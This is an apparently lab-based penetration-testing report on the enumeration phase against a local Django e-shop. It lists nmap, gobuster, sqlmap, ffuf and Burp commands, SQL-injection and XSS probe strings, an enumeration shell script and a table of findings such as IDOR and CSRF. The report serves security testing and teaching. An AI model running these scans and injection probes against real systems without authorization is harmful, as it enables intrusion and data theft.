# Enumeration Phase - Complete Penetration Testing Report

## Overview
**Target**: E-Shop Web Application  
**Testing Environment**: Kali Linux VM (10.211.55.4) → macOS Host (10.211.55.2)  
**Objective**: Comprehensive enumeration to discover attack vectors and vulnerabilities  
**Methodology**: OWASP Web Security Testing Guide v4.2  

## Executive Summary

This document details the complete enumeration phase of our penetration testing engagement. Through systematic information gathering and analysis, we identified multiple security weaknesses including SQL injection points, authentication flaws, XSS vulnerabilities, CSRF gaps, and access control issues. Our methodology follows industry best practices, utilizing both automated tools and manual testing techniques.

---

## Phase 1: Initial Reconnaissance

### 1.1 Network Discovery

**[SCREENSHOT - Network Setup Verification]**
```bash
# From Kali VM terminal
ip addr show
# Screenshot showing Kali IP: 10.211.55.4

# Verify target accessibility
ping -c 4 10.211.55.2
# Screenshot showing successful ping responses
```

### 1.2 Port Scanning

**[SCREENSHOT - Nmap Initial Scan]**
```bash
# Quick TCP scan
sudo nmap -sS -F 10.211.55.2
# Screenshot showing open ports

# Detailed service scan
sudo nmap -sV -sC -p- 10.211.55.2 -oA eshop_full_scan
# Screenshot of results showing:
# - Port 8000/tcp open (Django development server)
```

**[SCREENSHOT - Service Detection]**
```bash
# HTTP service enumeration
sudo nmap -p 8000 --script http-enum,http-headers,http-methods 10.211.55.2
# Screenshot showing HTTP headers and methods
```

### 1.3 Web Service Identification

**[SCREENSHOT - Whatweb Analysis]**
```bash
whatweb http://10.211.55.2:8000 -v
# Screenshot showing:
# - Django framework detection
# - Python version hints
# - Cookie names (sessionid, csrftoken)
```

**[SCREENSHOT - Curl Headers]**
```bash
curl -I http://10.211.55.2:8000
curl -I http://10.211.55.2:8000/login/
# Screenshot showing response headers
# Note: No security headers (X-Frame-Options, CSP, etc.)
```

---

## Phase 2: Web Application Mapping

### 2.1 Directory and File Discovery

**[SCREENSHOT - Gobuster Directory Scan]**
```bash
# Directory enumeration
gobuster dir -u http://10.211.55.2:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,py -t 50 \
  -o gobuster_results.txt

# Screenshot showing discovered paths:
# /login/ (Status: 200)
# /logout/ (Status: 302)
# /admin/ (Status: 302)
# /static/ (Status: 301)
# /media/ (Status: 301)
```

**[SCREENSHOT - Dirb Alternative Scan]**
```bash
dirb http://10.211.55.2:8000 /usr/share/dirb/wordlists/common.txt
# Screenshot of additional findings
```

### 2.2 Technology Stack Fingerprinting

**[SCREENSHOT - Wappalyzer in Firefox]**
```bash
# From Kali Firefox
1. Install Wappalyzer extension
2. Browse to http://10.211.55.2:8000
# Screenshot showing detected technologies:
# - Django Web Framework
# - Python
# - SQLite/PostgreSQL hints
```

**[SCREENSHOT - Browser Developer Tools]**
```bash
# Firefox Developer Tools (F12)
1. Network tab while browsing
2. Check response headers
# Screenshot showing:
# - Server: WSGIServer/0.2 CPython/3.x
# - Set-Cookie headers revealing session management
# - Missing security headers
```

### 2.3 Initial Spider/Crawl

**[SCREENSHOT - OWASP ZAP Spider]**
```bash
# Start OWASP ZAP
zaproxy &

# Configure and run spider:
1. Set target: http://10.211.55.2:8000
2. Spider → Start Scan
# Screenshot of discovered URLs in tree view
```

**[SCREENSHOT - Burp Suite Crawler]**
```bash
# Burp Suite Professional/Community
1. Target → Scope → Add: http://10.211.55.2:8000
2. Dashboard → New Scan → Crawl
# Screenshot showing site map
```

---

## Phase 3: Authentication Mechanism Analysis

### 3.1 Login Page Discovery

**[SCREENSHOT - Login Form Analysis]**
```bash
firefox http://10.211.55.2:8000/login/
# Screenshot showing:
# - Username/password fields
# - CSRF token present
# - "Captcha temporarily disabled" message (VULNERABILITY!)
```

**[SCREENSHOT - View Source]**
```bash
# Right-click → View Page Source
# Screenshot highlighting:
# - Form action="/login/"
# - CSRF token in hidden field
# - No CAPTCHA implementation
```

### 3.2 Authentication Testing

**[SCREENSHOT - Login Error Messages]**
```bash
# Test 1: Valid username, wrong password
Username: admin
Password: wrongpass
# Screenshot showing error: "Invalid username or password"

# Test 2: Invalid username
Username: doesnotexist
Password: test
# Screenshot showing SAME error (Good - no user enumeration here)
```

**[SCREENSHOT - Burp Intruder Setup]**
```bash
# Brute force testing setup
1. Intercept login request
2. Send to Intruder
3. Set payload positions on username and password
4. Load username list: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# Screenshot of Intruder configuration
```

### 3.3 Session Management Analysis

**[SCREENSHOT - Cookie Analysis]**
```bash
# After successful login (admin/admin123)
# Firefox Developer Tools → Storage → Cookies
# Screenshot showing:
# - sessionid cookie (HttpOnly: False - VULNERABILITY!)
# - csrftoken cookie
# - No Secure flag (VULNERABILITY!)
# - No SameSite attribute set properly
```

**[SCREENSHOT - Session Token Randomness]**
```bash
# Burp Sequencer Analysis
1. Capture 100+ session tokens
2. Analyze randomness
# Screenshot of Sequencer results
```

---

## Phase 4: Input Point Identification

### 4.1 GET Parameters

**[SCREENSHOT - URL Parameter Discovery]**
```bash
# Manual browsing reveals:
/catalog/?q=search_term
/product/<uuid>/
/order/<id>/

# Screenshot of each endpoint in browser
```

**[SCREENSHOT - Parameter Fuzzing]**
```bash
# Using ffuf for parameter discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://10.211.55.2:8000/catalog/?FUZZ=test" \
     -b "sessionid=YOUR_SESSION_ID" \
     -mc 200 -c -v

# Screenshot showing discovered parameters
```

### 4.2 POST Endpoints

**[SCREENSHOT - Form Analysis]**
```bash
# Identify all forms using Burp
1. Browse entire application with Burp proxy
2. Target → Site map → Filter by "POST"
# Screenshot showing POST endpoints:
# - /login/ (authentication)
# - /add-to-cart/ (AJAX)
# - /transfer-credits/ (CSRF vulnerable!)
# - /update-email/ (CSRF vulnerable!)
```

### 4.3 AJAX Endpoints

**[SCREENSHOT - Browser Network Tab]**
```bash
# Discovering AJAX calls
1. Open Network tab in Firefox
2. Add item to cart
# Screenshot showing:
# - POST /add-to-cart/
# - JSON request/response
# - Missing CSRF token in some requests
```

---

## Phase 5: Vulnerability Indicators Discovery

### 5.1 SQL Injection Indicators

**[SCREENSHOT - Search Function Testing]**
```bash
# Basic SQL injection test
firefox "http://10.211.55.2:8000/catalog/?q='"
# Screenshot showing unusual behavior

# Boolean test
firefox "http://10.211.55.2:8000/catalog/?q=' OR '1'='1"
# Screenshot showing ALL products (SQL INJECTION CONFIRMED!)
```

**[SCREENSHOT - SQLMap Quick Test]**
```bash
sqlmap -u "http://10.211.55.2:8000/catalog/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch --smart --risk=1 --level=1
# Screenshot showing "parameter 'q' is vulnerable"
```

### 5.2 XSS Detection

**[SCREENSHOT - Basic XSS Probe]**
```bash
# Test in search box
<script>alert('XSS')</script>
# Screenshot showing reflected input

# Test in product review
1. Navigate to product page
2. Submit review with: <img src=x onerror=alert('XSS')>
# Screenshot showing stored XSS trigger
```

**[SCREENSHOT - XSStrike Tool]**
```bash
# Automated XSS detection
python3 xsstrike.py -u "http://10.211.55.2:8000/catalog/?q=test" \
        --cookie "sessionid=YOUR_SESSION_ID"
# Screenshot of XSS findings
```

### 5.3 Access Control Testing

**[SCREENSHOT - IDOR Detection]**
```bash
# Order enumeration
# As logged in user, access your order:
firefox http://10.211.55.2:8000/order/YOUR_ORDER_ID/

# Try incrementing ID:
firefox http://10.211.55.2:8000/order/ANOTHER_ORDER_ID/
# Screenshot showing another user's order (IDOR VULNERABILITY!)
```

**[SCREENSHOT - Burp Autorize]**
```bash
# Using Autorize extension
1. Install Autorize in Burp
2. Set low-privilege user session
3. Browse as admin
# Screenshot showing authorization failures
```

### 5.4 CSRF Vulnerability Detection

**[SCREENSHOT - CSRF Token Analysis]**
```bash
# Burp Repeater test
1. Capture transfer-credits request
2. Remove CSRF token
3. Replay request
# Screenshot showing successful request without token!
```

**[SCREENSHOT - CSRF PoC Generator]**
```bash
# Burp Professional CSRF PoC
1. Right-click on vulnerable request
2. Engagement tools → Generate CSRF PoC
# Screenshot of generated HTML
```

---

## Phase 6: Automated Vulnerability Scanning

### 6.1 OWASP ZAP Active Scan

**[SCREENSHOT - ZAP Configuration]**
```bash
# Configure authenticated scan
1. Set authentication method
2. Create context
3. Add session management
# Screenshot of ZAP settings
```

**[SCREENSHOT - ZAP Scan Results]**
```bash
# Run active scan
Tools → Active Scan → Start Scan
# Screenshot showing:
# - SQL Injection (High)
# - XSS Reflected (Medium)
# - Missing Security Headers (Low)
# - Session Cookie Without Secure Flag (Medium)
```

### 6.2 Nikto Web Scanner

**[SCREENSHOT - Nikto Scan]**
```bash
nikto -h http://10.211.55.2:8000 -C all -o nikto_scan.html
# Screenshot of findings:
# - Interesting files/directories
# - Server information disclosure
# - Missing headers
```

### 6.3 Burp Scanner (If Professional)

**[SCREENSHOT - Burp Scan Configuration]**
```bash
# New scan configuration
1. Add target URLs
2. Use crawled data
3. Select audit checks
# Screenshot of scan setup
```

---

## Phase 7: Manual Security Header Analysis

**[SCREENSHOT - Security Headers Check]**
```bash
# Using curl to check headers
curl -I http://10.211.55.2:8000/login/ | grep -E "(X-Frame|X-Content|Content-Security|Strict-Transport)"
# Screenshot showing MISSING headers:
# - X-Frame-Options
# - X-Content-Type-Options
# - Content-Security-Policy
# - Strict-Transport-Security
```

**[SCREENSHOT - Online Security Headers Test]**
```bash
# If exposed to internet, use:
firefox https://securityheaders.com
# Enter target URL
# Screenshot of F grade
```

---

## Phase 8: Information Disclosure Analysis

### 8.1 Error Message Analysis

**[SCREENSHOT - Debug Mode Detection]**
```bash
# Force an error
firefox http://10.211.55.2:8000/nonexistent/
# Screenshot showing Django debug page (DEBUG=True)
# Reveals:
# - Full file paths
# - Environment variables
# - Database queries
```

**[SCREENSHOT - Stack Trace Information]**
```bash
# Trigger application error
# Submit malformed data to forms
# Screenshot of detailed error with code snippets
```

### 8.2 Source Code Comments

**[SCREENSHOT - JavaScript Analysis]**
```bash
# View source of pages
# Check static JavaScript files
firefox view-source:http://10.211.55.2:8000/static/js/cart.js
# Screenshot showing:
# - TODO comments
# - Hardcoded values
# - API endpoints
```

---

## Phase 9: API Endpoint Discovery

**[SCREENSHOT - API Fuzzing]**
```bash
# Discover API endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u "http://10.211.55.2:8000/FUZZ" \
     -b "sessionid=YOUR_SESSION_ID" \
     -mc 200,301,302,401 -c

# Screenshot of discovered endpoints
```

**[SCREENSHOT - GraphQL/REST Detection]**
```bash
# Check for GraphQL
curl -X POST http://10.211.55.2:8000/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name } } }"}'

# Check common API paths
for path in /api /api/v1 /api/v2 /rest /graphql; do
    echo "Checking $path"
    curl -I http://10.211.55.2:8000$path
done
# Screenshot of results
```

---

## Phase 10: Vulnerability Summary Matrix

Based on our enumeration, we discovered:

| Finding | Tool Used | Severity | Screenshot Reference |
|---------|-----------|----------|---------------------|
| SQL Injection in search | Manual + SQLMap | CRITICAL | Screenshot 5.1 |
| Stored XSS in reviews | Manual + XSStrike | HIGH | Screenshot 5.2 |
| IDOR in order viewing | Manual + Autorize | HIGH | Screenshot 5.3 |
| Missing CSRF protection | Burp Repeater | MEDIUM | Screenshot 5.4 |
| Session cookies not secure | Developer Tools | MEDIUM | Screenshot 3.3 |
| Debug mode enabled | Manual browsing | HIGH | Screenshot 8.1 |
| No rate limiting | Burp Intruder | MEDIUM | Screenshot 3.2 |
| Missing security headers | Curl + Tools | LOW | Screenshot 7 |

---

## Enumeration Workflow Automation Script

**[SCREENSHOT - Running Automation]**
```bash
#!/bin/bash
# enumeration.sh - Save this on Kali

TARGET="http://10.211.55.2:8000"
SESSION="YOUR_SESSION_ID"

echo "[+] Starting enumeration of $TARGET"

# Create output directory
mkdir -p enum_results
cd enum_results

# Nmap scan
echo "[+] Running Nmap..."
nmap -sV -sC -p- 10.211.55.2 -oA nmap_scan

# Directory enumeration
echo "[+] Running Gobuster..."
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

# Nikto scan
echo "[+] Running Nikto..."
nikto -h $TARGET -o nikto.html -Format html

# WhatWeb
echo "[+] Running WhatWeb..."
whatweb $TARGET -v > whatweb.txt

# Check security headers
echo "[+] Checking security headers..."
curl -I $TARGET | grep -E "(X-Frame|X-Content|Content-Security|Strict)" > headers.txt

# Quick SQLMap test
echo "[+] Testing for SQL injection..."
sqlmap -u "$TARGET/catalog/?q=test" --cookie="sessionid=$SESSION" --batch --smart --level=1 --risk=1 -o sqlmap_quick.txt

echo "[+] Enumeration complete! Check enum_results directory"
```

---

## Key Enumeration Findings Leading to Vulnerabilities

1. **No CAPTCHA** → Brute force attacks possible
2. **Debug mode enabled** → Information disclosure
3. **Missing security headers** → Clickjacking, XSS exploitation easier
4. **Session cookies not secure** → Session hijacking over HTTP
5. **Direct object references** → IDOR vulnerabilities
6. **No rate limiting** → Automated attacks possible
7. **SQL error messages** → SQL injection indicators
8. **Reflected user input** → XSS vulnerabilities
9. **CSRF tokens not validated** → CSRF attacks possible
10. **Weak password hashes** → Found through SQL injection → Easy to crack

---

## Screenshot Tools Reference

```bash
# Kali screenshot tools
gnome-screenshot          # Full desktop
gnome-screenshot -w      # Current window
gnome-screenshot -a      # Select area
scrot                    # Command line screenshot
flameshot gui           # Advanced screenshot tool
kazam                   # Screen recording

# Terminal recording
asciinema rec session.cast    # Record terminal
asciinema play session.cast   # Playback
script -r terminal.log        # Basic recording

# Burp/ZAP screenshots
# Use built-in "Save" or system screenshot tools
```

---

## Next Steps

With enumeration complete, we have identified multiple attack vectors:

1. **SQL Injection** → Proceed to data extraction
2. **XSS Vulnerabilities** → Develop payload for session theft  
3. **IDOR Issues** → Access other users' data
4. **CSRF Vulnerabilities** → Create attack pages
5. **Weak Authentication** → Password cracking after dump

Each finding from this enumeration phase provides a clear path for exploitation in the next phase of testing.

---

**Note**: This enumeration was performed in a controlled environment with proper authorization. All findings should be reported to the application owner for remediation.